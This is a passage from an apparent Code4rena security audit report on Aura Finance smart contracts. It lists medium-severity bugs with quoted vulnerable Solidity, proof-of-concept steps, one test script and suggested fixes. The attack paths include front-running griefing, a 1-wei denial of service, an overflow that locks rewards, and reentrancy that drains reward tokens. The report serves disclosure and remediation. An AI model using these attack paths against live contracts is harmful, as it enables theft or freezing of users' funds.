This will keep the low gas consumption of this flow, while giving a more accurate result.



 > [All code4rena fixes code-423n4/2022-05-aura#6](https://github.com/code-423n4/2022-05-aura/pull/6)



***"
123.md,Users can grief reward distribution,medium,"Users can grief reward distributions by spending dust.

### Proof of Concept

If a reward is targeted for an epoch in the past, a user can front-run the txn in the mempool and call `addRewardToEpoch()` with a dust amount at an epoch after the one in question. This will cause the transaction in the mempool to revert

```solidity
File: contracts/ExtraRewardsDistributor.sol   #1

74               require(len == 0 || rewardEpochs[_token][len - 1] < _epoch, ""Cannot backdate to this epoch"");
```

[ExtraRewardsDistributor.sol#L74](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/ExtraRewardsDistributor.sol#L74)

### Recommended Mitigation Steps

Allow the backdating of rewards, which will cost more gas


 > [code4rena aurafinance/aura-contracts#84](https://github.com/aurafinance/aura-contracts/pull/84)



***"
123.md,Rewards distribution can be delayed/never distributed on `AuraLocker.sol#L848`,medium,"Rewards distribution can be delayed/never distributed on [AuraLocker.sol#L848 ](https://github.com/aurafinance/aura-contracts-lite/blob/main/contracts/AuraLocker.sol#L848)

### Issue

Someone malicious can delay the rewards distribution for non `cvxCrv` tokens distributed on AuraLocker.sol.

1: Attacker will send one wei of token that are distributed on the [AuraLocker.sol ](https://github.com/aurafinance/aura-contracts-lite/blob/main/contracts/AuraLocker.sol) to [AuraStakingProxy](https://github.com/aurafinance/aura-contracts-lite/blob/6d60fca6f821dca1854a538807e7928ee582553a/contracts/AuraStakingProxy.sol).

2: Attacker will call [distributeOther](https://github.com/aurafinance/aura-contracts-lite/blob/6d60fca6f821dca1854a538807e7928ee582553a/contracts/AuraStakingProxy.sol#L203).<br>
The function will call notifyRewardAmount that calls [\_notifyReward](https://github.com/aurafinance/aura-contracts-lite/blob/main/contracts/AuraLocker.sol#L860)

When calling [\_notifyReward](https://github.com/aurafinance/aura-contracts-lite/blob/main/contracts/AuraLocker.sol#L860) the rewards left to distribute over the 7 days are redistributed throughout a new period starting immediately.

    uint256 remaining = uint256(rdata.periodFinish).sub(block.timestamp);
    uint256 leftover = remaining.mul(rdata.rewardRate);
    rdata.rewardRate = _reward.add(leftover).div(rewardsDuration).to96();

*Example:* If the reward rate is 1 token (10\*\*18) per second and 3.5 days are left (302400 seconds), we get a leftover of 302400 tokens. this is then divided by 604800, the reward rate is now 0.5 and the user of the protocol will have to wait one week for tokens that were supposed to be distributed over 3.5 days. This can be repeated again and again so that some rewards are never distributed.

### Recommended Mitigation Steps

I can see that [queueNewRewards](https://github.com/aurafinance/aura-contracts-lite/blob/main/contracts/AuraLocker.sol#L820) has some protective mechanism. A new period is started only if the token that is added on top of the already distributed tokens during the duration is over 120%.

I suggest adding a similar check to [queueNewRewards](https://github.com/aurafinance/aura-contracts-lite/blob/main/contracts/AuraLocker.sol#L820)



 > [code-423n4/2022-05-aura#6](https://github.com/code-423n4/2022-05-aura/pull/6)



***"
123.md,Reward may be locked forever if user doesn't claim reward for a very long time such that too many epochs have been passed,medium,"[ExtraRewardsDistributor.sol#L233-L240](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/ExtraRewardsDistributor.sol#L233-L240)<br>
[AuraLocker.sol#L334-L337](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L334-L337)<br>

Reward may be locked forever if user doesn't claim reward for a very long time such that too many epochs have been passed. The platform then forced to reimburse reward to the user that got their reward locked. Causing huge economics loss.

### Proof of Concept

Can be done by reverse engineering from the affected code

            for (uint256 i = epochIndex; i < tokenEpochs; i++) {
                //only claimable after rewards are ""locked in""
                if (rewardEpochs[_token][i] < latestEpoch) {
                    claimableTokens += _claimableRewards(_account, _token, rewardEpochs[_token][i]);
                    //return index user claims should be set to
                    epochIndex = i + 1;
                }
            }

From this line you will see a loop from epochIndex to tokenEpochs which loop tokenEpochs - epochIndex times.<br>
If tokenEpochs - epochIndex value goes high, it will consume too much gas which go beyond the limit of the chain and cause the transaction to be always failed. As a result, reward may be locked forever.

            uint256 latestEpoch = auraLocker.epochCount() - 1;
            // e.g. tokenEpochs = 31, 21
            uint256 tokenEpochs = rewardEpochs[_token].length;

            // e.g. epochIndex = 0
            uint256 epochIndex = userClaims[_token][_account];
            // e.g. epochIndex = 27 > 0 ? 27 : 0 = 27
            epochIndex = _startIndex > epochIndex ? _startIndex : epochIndex;

*   epochIndex is the maximum of \_startIndex and latest index of rewardEpochs that user has claim the reward
*   tokenEpochs is the number of epochs that has reward, can be added through `addRewardToEpoch` function up to latest epoch count of auraLocker
*   latestEpoch is epoch count of auraLocker

If you specified too high \_startIndex, the reward may be skipped and these skipped reward are lost forever as the \_getReward function set latest epoch that user has claim to the lastest index of rewardEpochs that can be claimed.

the aura locker epoch can be added by using `checkpointEpoch` function which will automatically add epochs up to current timestamp. Imagine today is 100 years from latest checkpoint and rewardsDuration is 1 day, the total of around 36500 epochs needed to be pushed into the array in single transaction which always failed due to gasLimit. The code that responsible for pushing new epochs below (in AuraLocker file)

                while (epochs[epochs.length - 1].date != currentEpoch) {
                    uint256 nextEpochDate = uint256(epochs[epochs.length - 1].date).add(rewardsDuration);
                    epochs.push(Epoch({ supply: 0, date: uint32(nextEpochDate) }));
                }

Even if these line are passed because the nature that checkpointEpoch is likely to be called daily and reward are added daily. if user doesn't claim the reward for 100 years, `rewardEpochs[_token].length = 36500 where epochIndex = 0. Which cause an impossible loop that run 36500 times`. In this case this transaction will always be failed due to gas limit. In the worst case, If this problem cause staking fund to be frozen, the only way is to trash the reward and use `emergencyWithdraw` to withdraw staked fund.

From above statement, we can proof that there exists a case that user reward may be locked forever due to looping too many times causing gas to be used beyond the limit thus transaction always failed.

### Tools Used

Reverse engineering using the help of IDE.

### Recommended Mitigation Steps

User should be able to supply endEpochIndex to the claim reward functions. And only calculate reward from startIndex to min(auraLocker.epochCount() - 1, endEpochIndex). And also add support for partial reward claiming.



 > [code4rena aurafinance/aura-contracts#84](https://github.com/aurafinance/aura-contracts/pull/84)



***"
123.md,Locking up AURA Token does not increase voting power of individual,medium,"Per the [documentation](https://github.com/code-423n4/2022-05-aura#auralocker), AURA tokens can be locked in the AuraLocker to recieve vlAURA. <u>**vlAURA is voting power**</u> in the AURA ecosystem.

It is also possible for the users to delegate their voting power to a specific address by calling the `AuraLocker.delegate(address account)` function.

However, after users locked up their AURA tokens in exchange for vlAURA tokens, their voting power did not increase.

### Proof of Concept

The following shows an example of Alice attempting to get some voting power by locking up her AURA tokens, but her voting power did not increase:

1.  At this point, Alice has not locked any AURA token into the AuraLocker yet. Thus, when `AuraLocker.getVotes(Alice.address)` is called, it returned “0” (No voting power. This is expected).

2.  Alice decided to get some voting power. So, Alice locked 100 AURA tokens by calling the [`AuraLocker._lock()`](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L258) function, and gain 100 vlAURA in return.

3.  Alice understand that as per the design, voting power will be 0 after depositing until the next epoch. So, she waited for around 1 week.

4.  After a week has passed, the `AuraLocker.getVotes(Alice.address)` is called again. Alice expected it to return""100"", but it still returned “0” (Still no voting power).

5.  Alice has locked up her AURA tokens for a week and hold 100 vlAURA, yet she has no voting power.

The following snippet of test script demonstrates the above issue, showing that the vote power remains the same after locking up the AURA tokens for a week.

```javascript
it(""(Debug) allows users to lock aura"", async () => {
    const cvxBalance = await phase4.cvx.balanceOf(stakerAddress);
    const lockBefore = await phase4.cvxLocker.lockedBalances(stakerAddress);
    console.log(""(Debug) User Locked Balance Record = Total %s CVX (Unlockable = %s CVX, Locked = %s CVX) "",lockBefore.total, lockBefore.unlockable, lockBefore.locked);

    console.log(""(Debug) User is going to lock %s CVX"", cvxBalance)
    await phase4.cvx.connect(staker.signer).approve(phase4.cvxLocker.address, cvxBalance);
    await phase4.cvxLocker.connect(staker.signer).lock(stakerAddress, cvxBalance);

    const lockAfter = await phase4.cvxLocker.lockedBalances(stakerAddress);
    console.log(""(Debug) User Locked Balance Record = Total %s CVX (Unlockable = %s CVX, Locked = %s CVX) "",lockAfter.total, lockAfter.unlockable, lockAfter.locked);

    expect(lockAfter.locked.sub(lockBefore.locked)).eq(cvxBalance);
});
it(""(Debug) check user has votes after locking"", async () => {
    const votesBefore = await phase4.cvxLocker.getVotes(stakerAddress);
    const lock = await phase4.cvxLocker.lockedBalances(stakerAddress);
    console.log(""(Debug) votesBefore = %s, locked CVX = %s"", votesBefore, lock.locked);
    console.log(""(Debug) Properly locked tokens as of the most recent eligible epoch = %s"", await phase4.cvxLocker.balanceOf(stakerAddress));

    await increaseTime(ONE_WEEK);
    console.log(""After 1 week"")

    const votesAfter = await phase4.cvxLocker.getVotes(stakerAddress);
    console.log(""(Debug) votesAfter = %s, locked CVX = %s"", votesBefore, lock.locked);
    console.log(""(Debug) Properly locked tokens as of the most recent eligible epoch = %s"", await phase4.cvxLocker.balanceOf(stakerAddress));

    expect(votesAfter.sub(votesBefore)).eq(lock.locked);

});
it(""(Debug) check user lock balance and votes after 20 weeks"", async () => {
    const TWENTY_WEEKS = BN.from(60 * 60 * 24 * 7 * 20);
    await increaseTime(TWENTY_WEEKS);
    console.log(""(Debug) After 20 weeks"")

    const lockAfter20 = await phase4.cvxLocker.lockedBalances(stakerAddress);
    console.log(""(Debug) User Locked Balance = Total %s CVX (Unlockable = %s CVX, Locked = %s CVX) "",lockAfter20.total, lockAfter20.unlockable, lockAfter20.locked);
    console.log(""(Debug) Properly locked tokens as of the most recent eligible epoch = %s"", await phase4.cvxLocker.balanceOf(stakerAddress));

    expect(lockAfter20.unlockable).eq(lockAfter20.total); // all locks should have expired after 20 weeks.
});
```

Following is the output of the test script.

1.  The first section shows that user has 800563688188805506352 vlAURA after locking up their AURA tokens

2.  The second section shows that after a week, the user has 0 voting power even though the user has `800557536376417310407` vlAURA tokens. Note that these vlAURA tokens are all properly locked tokens that have not been expired.

(Note: vlAURA == vlCVX and AURA == CVX in this context)

```javascript
        aura locker
(Debug) User Locked Balance Record = Total 0 CVX (Unlockable = 0 CVX, Locked = 0 CVX) 
(Debug) User is going to lock 800563688188805506352 CVX
(Debug) User Locked Balance Record = Total 800563688188805506352 CVX (Unlockable = 0 CVX, Locked = 800563688188805506352 CVX) 
          ✓ (Debug) allows users to lock aura

(Debug) votesBefore = 0, locked CVX = 800563688188805506352
(Debug) Properly locked tokens as of the most recent eligible epoch = 0
After 1 week
(Debug) votesAfter = 0, locked CVX = 800563688188805506352
(Debug) Properly locked tokens as of the most recent eligible epoch = 800563688188805506352
          1) (Debug) check user has votes after locking

(Debug) After 20 weeks
(Debug) User Locked Balance = Total 800563688188805506352 CVX (Unlockable = 800563688188805506352 CVX, Locked = 0 CVX) 
(Debug) Properly locked tokens as of the most recent eligible epoch = 0
          ✓ (Debug) check user lock balance and votes after 20 weeks
```

Aura Finance has implemented a checkpointing mechanism for determine user's voting power. Therefore, accounting for the votes will only happen during checkpoint when [`AuraLocker.checkpointDelegate()`](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L511) function is being
called. Therefore, the [`AuraLocker.getVotes()`](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L576) function will only consider the locked AURA tokens that have been “checkpointed” as votes. In other words, if the locked AURA tokens have not been “checkpointed” yet, it will simply remain as a balance in the AuraLocker contract, and the user’s locked AURA tokens effectively have no voting power.

Based on the source code, the root cause of this issue is that if a user does not have a delegatee, the system will not perform any checkpointing, and user's locked AURA token will not be accounted as voting power.

Following code from [`AuraLocker._lock()`](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L258) shows that checkpointing will only be performed if the user has a delegatee. Otherwise, no checkpointing will be performed when users locked their AURA tokens.

```solidity
function _lock(address _account, uint256 _amount) internal {
    ..SNIP..
    address delegatee = delegates(_account);
    if (delegatee != address(0)) {
        delegateeUnlocks[delegatee][unlockTime] += lockAmount;
        _checkpointDelegate(delegatee, lockAmount, 0);
    }
    // @audit - No checkpointing performed for the rest of the code in this function
    ..SNIP..
}
```

The only way for Alice could get back her voting power is to delegate to herself after locking her AURA tokens. This is a workaround. `AuraLocker.delegate()` sole purpose should only serve to delegate one’s voting power to another user, and should not be used as a workaround to force the system to perform checkpointing to gain voting power.

For Alice to get back her voting power, she must call the `AuraLocker.delegate(Alice.address)` function, which will delegate to herself. This function will in turn call the `AuraLocker._checkpointDelegate()` function, which will “checkpointed” Alice’s locked tokens to become votes. Only after this step, Alice’s voting power will be updated and calling `AuraLocker.getVotes(Alice.address)` should return “100” now.

Additionally, documentation did not mention that a user is required to delegate to oneself in order to get the voting power. Thus, it is very likely that majority of the users would not know how to get their voting power unless they review the source code or is aware of this workaround.

### Impact

The impact of this issue is that users might miss the opportunity to vote on critical protocol decisions or flow of incentives (Gauge voting) due to lack of voting power as voting power is not assigned to them after locking up AURA tokens.

If the users only realised this issue in the current epoch, they would miss the chance to vote in current epoch. This is because by calling the `AuraLocker.delegate(address account)` function to fix the issue, the votes will only be effective in the next epoch.

The outcome of the governance or gauge voting might be impacted and might not reflect the true consensus of the community as affected users are not able to participate in the vote or have inaccurate voting power, thus affecting the protocol.

### Recommended Mitigation Steps

In Convex Finance, users lock their CVX tokens by calling `CvxLocker._lock()` function and voting power will be allocated to the users immediately. Similar strategy should be adopted.

It is recommended to update the `AuraLocker._lock()` function so that the user’s locked AURA tokens are “checkpointed” and converted to voting power immediately after locking up if a user has not assigned a delegatee yet. This will trigger the accounting for votes and translate the newly locked tokens into voting power immediately.

Original Code

```solidity
function _lock(address _account, uint256 _amount) internal {
    ..SNIP..
    address delegatee = delegates(_account);
    if (delegatee != address(0)) {
        delegateeUnlocks[delegatee][unlockTime] += lockAmount;
        _checkpointDelegate(delegatee, lockAmount, 0);
    }
    ..SNIP..
}
```

Suggested Modification

```solidity
function _lock(address _account, uint256 _amount) internal {
    ..SNIP..
    address delegatee = delegates(_account);
    if (delegatee != address(0)) {
        delegateeUnlocks[delegatee][unlockTime] += lockAmount;
        _checkpointDelegate(delegatee, lockAmount, 0);
    } else {
        // If there is no delegatee, 
        // then automatically delegate to the account to trigger the checkpointing
        delegateeUnlocks[_account][unlockTime] += lockAmount;
        _checkpointDelegate(_account, lockAmount, 0);
    }
    ..SNIP..
}
```





***"
123.md,Reward can be vested even after endTime,medium,"[AuraVestedEscrow.sol#L96](https://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraVestedEscrow.sol#L96)<br>

Reward vesting should end once endTime is reached, this is not done currently.

### Proof of Concept

1.  Observe the fund function
2.  Observe that there is no check to disallow funding once endTime has been reached

### Recommended Mitigation Steps

Add below check

    require(block.timestamp<=endTime, ""Reward vesting period over"");



 > [All code4rena fixes code-423n4/2022-05-aura#6](https://github.com/code-423n4/2022-05-aura/pull/6)



***"
123.md,Increase voting power by tokenizing the address that locks the token,medium,"[AuraLocker.sol#L258-L295](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L258-L295)<br>

Without restriction on the type of address that `lock` the token, a bad actor could lock the token through the smart contract. Doing so enable him to make the lockedToken becomes liquidate by tokenize his smart contract which defeat the purpose of the lockedToken that is supposed to be untransferable. Moreover, a bad actor could attract people to lock the token through his smart contract instead of directly locking with AuraLocker by injecting better short-term incentives to his wrapper token. This enable the bad actor to accumulate voting power that could dictate the future of the protocol.

### Proof of Concept

* A bad actor creates a smart contract<br>
* A contract calls `lock` in AuraLocker and locks the token<br>
* A bad actor tokenizes the contract<br>
* A bad actor attracts people to lock the token through his smart contract by offering a wrapper tokens or additional incentives like high apy etc.<br>
* A bad actor dictates the smart contract to delegate its vote to his preferred address.<br>

### Recommended Mitigation Steps

It would be best to check whether the locker is the smart contract or the wallet and, if the protocol wants the smart contract to be the locker, it can implement the whitelist or blacklist.



 > [code4rena aurafinance/aura-contracts#84](https://github.com/aurafinance/aura-contracts/pull/84)



***"
123.md,Users may lose rewards to other users if rewards are given as fee-on-transfer tokens,medium,"If rewards are given in fee-on-transfer tokens, users may get no rewards, breaking functionality.

`Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or :::leak value with a hypothetical attack path with stated assumptions:::, but external requirements.`
(emphasis mine)

The underlying BAL protocol support fee-on-transfer tokens, so should Aura.

### Proof of Concept

```solidity
File: contracts/ExtraRewardsDistributor.sol   #1

87       function _addReward(
88           address _token,
89           uint256 _amount,
90           uint256 _epoch
91       ) internal nonReentrant {
92           // Pull before reward accrual
93           IERC20(_token).safeTransferFrom(msg.sender, address(this), _amount);
94   
95           //convert to reward per token
96           uint256 supply = auraLocker.totalSupplyAtEpoch(_epoch);
97           uint256 rPerT = (_amount * 1e20) / supply;
98           rewardData[_token][_epoch] += rPerT;
```

[ExtraRewardsDistributor.sol#L87-L98](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/ExtraRewardsDistributor.sol#L87-L98)<br>

If a fee is charged the total amount available to be transferred later will be less than the `_amount` passed in.

Consider the following scenario:<br>
User A holds 98% of the total supply of vlBAL (the system is being bootstrapped)<br>
User B holds 1%<br>
User C holds 1%

1.  `_token` is given out as a reward. It is a fee-on-transfer token with a fee of 2%
2.  Nobody claims the reward until it's fully available (to save gas on transaction fees)
3.  User A is the first to claim his/her reward and gets 98% of the reward, leaving 0 wei of the token left (since the other 2% was already taken as a fee by the token itself)
4.  User B tries to claim and the call reverts since there's no balance left
5.  User C tries to claim and the call reverts for them too
6.  Users B and C are angry and stop using Aura

```solidity
File: contracts/ExtraRewardsDistributor.sol   #2

87       function _addReward(
88           address _token,
89           uint256 _amount,
90           uint256 _epoch
91       ) internal nonReentrant {
92           // Pull before reward accrual
93           IERC20(_token).safeTransferFrom(msg.sender, address(this), _amount);
94   
95           //convert to reward per token
96           uint256 supply = auraLocker.totalSupplyAtEpoch(_epoch);
97           uint256 rPerT = (_amount * 1e20) / supply;
98           rewardData[_token][_epoch] += rPerT;
```

[ExtraRewardsDistributor.sol#L87-L98](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/ExtraRewardsDistributor.sol#L87-L98)

### Recommended Mitigation Steps

Measure the contract balance before and after the transfer, and use the difference as the amount, rather than the stated amount.



 > That said, this clearly requires external factors and relies on hypothetical attack motivation that seems unlikely to me. I think it should be included as a medium risk.""



***"
123.md,User will lose funds,medium,"[AuraClaimZap.sol#L224-L226](https://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraClaimZap.sol#L224-L226)<br>

It was observed that User will lose funds due to missing else condition.

### Proof of Concept

1.  User call claimRewards at ClaimZap.sol#L103 with Options.LockCvx as false
2.  claimRewards internally calls \_claimExtras
3.  Everything goes good until AuraClaimZap.sol#L218

<!---->

    if (depositCvxMaxAmount > 0) {
                uint256 cvxBalance = IERC20(cvx).balanceOf(msg.sender).sub(removeCvxBalance);
                cvxBalance = AuraMath.min(cvxBalance, depositCvxMaxAmount);
                if (cvxBalance > 0) {
                    //pull cvx
                    IERC20(cvx).safeTransferFrom(msg.sender, address(this), cvxBalance);
                    if (_checkOption(options, uint256(Options.LockCvx))) {
                        IAuraLocker(locker).lock(msg.sender, cvxBalance);
                    }
                }
            }

4.  Since user cvxBalance>0 so cvxBalance is transferred from user to the contract.
5.  Now since Options.LockCvx was set to false in options so if (\_checkOption(options, uint256(Options.LockCvx))) does not evaluate to true and does not execute
6.  This means User cvx funds are stuck in contract

### Recommended Mitigation Steps

The condition should check if user has enabled lock for cvx, otherwise cvx should not be transferred from user

    if (depositCvxMaxAmount > 0 && _checkOption(options, uint256(Options.LockCvx))) {
              uint256 cvxBalance = IERC20(cvx).balanceOf(msg.sender).sub(removeCvxBalance);
              cvxBalance = AuraMath.min(cvxBalance, depositCvxMaxAmount);
              if (cvxBalance > 0) {
                  //pull cvx
                  IERC20(cvx).safeTransferFrom(msg.sender, address(this), cvxBalance);

                      IAuraLocker(locker).lock(msg.sender, cvxBalance);
              }
          }



 > [All code4rena fixes code-423n4/2022-05-aura#6](https://github.com/code-423n4/2022-05-aura/pull/6)



***"
123.md,"`ConvexMasterChef`: When `_lpToken` is cvx, reward calculation is incorrect",medium,"In the ConvexMasterChef contract, a new staking pool can be added using the add() function. The staking token for the new pool is defined using the \_lpToken variable. However, there is no additional checking whether the \_lpToken is the same as the reward token (cvx) or not.

      function add(
          uint256 _allocPoint,
          IERC20 _lpToken,
          IRewarder _rewarder,
          bool _withUpdate
      ) public onlyOwner {
          if (_withUpdate) {
              massUpdatePools();
          }
          uint256 lastRewardBlock = block.number > startBlock
              ? block.number
              : startBlock;
          totalAllocPoint = totalAllocPoint.add(_allocPoint);
          poolInfo.push(
              PoolInfo({
                  lpToken: _lpToken,
                  allocPoint: _allocPoint,
                  lastRewardBlock: lastRewardBlock,
                  accCvxPerShare: 0,
                  rewarder: _rewarder
              })
          );
      }

When the \_lpToken is the same token as cvx, reward calculation for that pool in the updatePool() function can be incorrect. This is because the current balance of the \_lpToken in the contract is used in the calculation of the reward. Since the \_lpToken is the same token as the reward, the reward minted to the contract will inflate the value of lpSupply, causing the reward of that pool to be less than what it should be.

      function updatePool(uint256 _pid) public {
          PoolInfo storage pool = poolInfo[_pid];
          if (block.number <= pool.lastRewardBlock) {
              return;
          }
          uint256 lpSupply = pool.lpToken.balanceOf(address(this));
          if (lpSupply == 0) {
              pool.lastRewardBlock = block.number;
              return;
          }
          uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number);
          uint256 cvxReward = multiplier
              .mul(rewardPerBlock)
              .mul(pool.allocPoint)
              .div(totalAllocPoint);
          //cvx.mint(address(this), cvxReward);
          pool.accCvxPerShare = pool.accCvxPerShare.add(
              cvxReward.mul(1e12).div(lpSupply)
          );
          pool.lastRewardBlock = block.number;
      }

### Proof of Concept

[ConvexMasterChef.sol#L96-L118](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/ConvexMasterChef.sol#L96-L118)<br>
[ConvexMasterChef.sol#L186-L206](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/ConvexMasterChef.sol#L186-L206)

### Recommended Mitigation Steps

Add a check that \_lpToken is not cvx in the add function or mint the reward token to another contract to prevent the amount of the staked token from being mixed up with the reward token.






***"
123.md,Integer overflow will lock all rewards in `AuraLocker`,medium,"[AuraLocker.sol#L176-L177](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L176-L177)<br>
[AuraLocker.sol#L802-L814](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L802-L814)<br>
[AuraLocker.sol#L864](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L864)<br>

There is a potential overflow in the rewards calculations which would lead to `updateReward()` always reverting.

The impact of this overflow is that all reward tokens will be permanently locked in the contract. User's will be unable to call any of the functions which have the `updateReward()` modifier, that is:

*   `lock()`
*   `getReward()`
*   `_processExpiredLocks()`
*   `_notifyReward()`

As a result the contract will need to call `shutdown()` and the users will only be able to receive their staked tokens via `emergencyWithdraw()`, which does not transfer the users the reward tokens.

Note that if one reward token overflows this will cause a revert on all reward tokens due to the loop over reward tokens.

This issue will always be present if the staked token is one with a low number of decimal places such as USDC or USDT which have 6 decimal places. This is because the `totalSupply` will be limited in size by the decimal places of the `stakingToken`.

### Proof of Concept

The overflow may occur due to the base of values in `_rewardPerToken()`.

```solidity
    function _rewardPerToken(address _rewardsToken) internal view returns (uint256) {
        if (lockedSupply == 0) {
            return rewardData[_rewardsToken].rewardPerTokenStored;
        }
        return
            uint256(rewardData[_rewardsToken].rewardPerTokenStored).add(
                _lastTimeRewardApplicable(rewardData[_rewardsToken].periodFinish)
                    .sub(rewardData[_rewardsToken].lastUpdateTime)
                    .mul(rewardData[_rewardsToken].rewardRate)
                    .mul(1e18)
                    .div(lockedSupply)
            );
    }
```

The return value of `_rewardPerToken()` is in terms of

    (now - lastUpdateTime) * rewardRate * 10**18 / totalSupply

Here `(now - lastUpdateTime)` has a maximum value of `rewardDuration = 6 * 10**5`.

Now `rewardRate` is the `_reward.div(rewardsDuration)` as seen in `_notifyRewardAmount()` on line #864. Note that `rewardDuration` is a constant 604,800.

`rewardDuration = 6 * 10**5`

Thus, if we have a rewards such as AURA or WETH (or most ERC20 tokens) which have units 10\*\*18 we can transfer 1 WETH to the reward distributor which calls `_notifyRewardAmount()` and  sets the reward rate to,

`rewardRate = 10**18 / (6 * 10**5) ~= 10**12`

Finally, if this attack is run either by the first depositor they may `lock()` a single token which would set `totalSupply = 1`.

Therefore our equation in terms of units will become,

    (now - lastUpdateTime) * rewardRate * 10**18 / totalSupply => 10**5 * 10**12 * 10**18 / 1 = 10**35

In since `rewardPerTokenStored` is a `uint96` it has a maximum value of `2**96 ~= 7.9 * 10**28`. Hence there will be an overflow in `newRewardPerToken.to96()`. Since we are unable to add more total supply due to `lock()` reverting there will be no way to circumvent this revert except to `shutdown()`.

```solidity
                uint256 newRewardPerToken = _rewardPerToken(token);
                rewardData[token].rewardPerTokenStored = newRewardPerToken.to96();
```

Note this attack is described when we have a low `totalSupply`. However it is also possible to apply this attack on a larger `totalSupply` when there are reward tokens which have decimal places larger than 18 or tokens which such as SHIB which have small token value and so many of the tokens can be bought for cheap.

### Recommended Mitigation Steps

To mitigate this issue it is recommended to increase the size of the `rewardPerTokenStored`. Since updating this value will require another slot to be used we recommend updating this to either `uint256` or to update both `rewardRate` and `rewardPerTokenStored` to be `uint224`.

 > IMO this should be a medium risk.


 > [code4rena aurafinance/aura-contracts#84](https://github.com/aurafinance/aura-contracts/pull/84)



***"
123.md,`ConvexMasterChef`: `safeRewardTransfer` can cause loss of funds,medium,"Same as <https://github.com/code-423n4/2022-02-concur-findings/issues/244>

All calculations are rounded down, since a lack of tokens in the contracts cannot be rounding errors' fault. So the function is redundant.<br>
On the other hand, if the contract is undersupplied with cvx tokens, this will cause depositors to be sent less tokens than needed (or none). This is especially unsafe because the tokens that were lacking are not resembled in accountings at all. Thus a depositor may invoke the safeRewardTransfer and not receive tokens they were supposed to.

### Proof of Concept

[ConvexMasterChef.sol#L299-L306](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/ConvexMasterChef.sol#L299-L306)

### Recommended Mitigation Steps

Use usual safeTransfer instead of safeRewardTransfer.






***"
123.md,DDOS in `BalLiquidityProvider`,medium,"DDOS to liquidity providers in BalLiquidityProvider.

### Proof of Concept

*   bal is equal to the contract’s balance of the asset: [BalLiquidityProvider.sol#L56](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/BalLiquidityProvider.sol#L56)

*   bal is required to be equal to the input parameter \_request.maxAmountsIn\[i]: [BalLiquidityProvider.sol#L57](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/BalLiquidityProvider.sol#L57)

An attacker can front-run liquidity providers by sending 1 Wei of the asset to make the balance not equal to the input. This can be repeated and be used to impede the liquidity provider from using the function which will always revert since bal != \_request.maxAmountsIn\[i]

### Recommended Mitigation Steps

Balances shouldn't be required to be equal to an input variable. An attacker can always make the balance a little bigger.  This check should be removed or changed to require (bal >=  \_request.maxAmountsIn\[i]).


 > [code4rena aurafinance/aura-contracts#84](https://github.com/aurafinance/aura-contracts/pull/84)



***"
123.md,`ConvexMasterChef`'s deposit and withdraw can be reentered drawing all reward funds from the contract if reward token allows for transfer flow control,medium,"Reward token accounting update in deposit() and withdraw() happens after reward transfer. If reward token allows for the control of transfer call flow or can be upgraded to allow it in the future (i.e. have or can introduce the \_beforetokentransfer, \_afterTokenTransfer type of hooks; or, say, can be upgraded to ERC777), the current implementation makes it possible to drain all the reward token funds of the contract by directly reentering deposit() or withdraw() with tiny \_amount.

Setting the severity to medium as this is conditional to transfer flow control assumption, but the impact is the full loss of contract reward token holdings.

### Proof of Concept

Both withdraw() and deposit() have the issue, performing late accounting update and not controlling for reentrancy:

[ConvexMasterChef.sol#L209-L221](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/ConvexMasterChef.sol#L209-L221)<br>

```solidity
    function deposit(uint256 _pid, uint256 _amount) public {
        PoolInfo storage pool = poolInfo[_pid];
        UserInfo storage user = userInfo[_pid][msg.sender];
        updatePool(_pid);
        if (user.amount > 0) {
            uint256 pending = user
                .amount
                .mul(pool.accCvxPerShare)
                .div(1e12)
                .sub(user.rewardDebt);
            safeRewardTransfer(msg.sender, pending);
        }
        pool.lpToken.safeTransferFrom(
```

[ConvexMasterChef.sol#L239-L250](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/ConvexMasterChef.sol#L239-L250)<br>

```solidity
    function withdraw(uint256 _pid, uint256 _amount) public {
        PoolInfo storage pool = poolInfo[_pid];
        UserInfo storage user = userInfo[_pid][msg.sender];
        require(user.amount >= _amount, ""withdraw: not good"");
        updatePool(_pid);
        uint256 pending = user.amount.mul(pool.accCvxPerShare).div(1e12).sub(
            user.rewardDebt
        );
        safeRewardTransfer(msg.sender, pending);
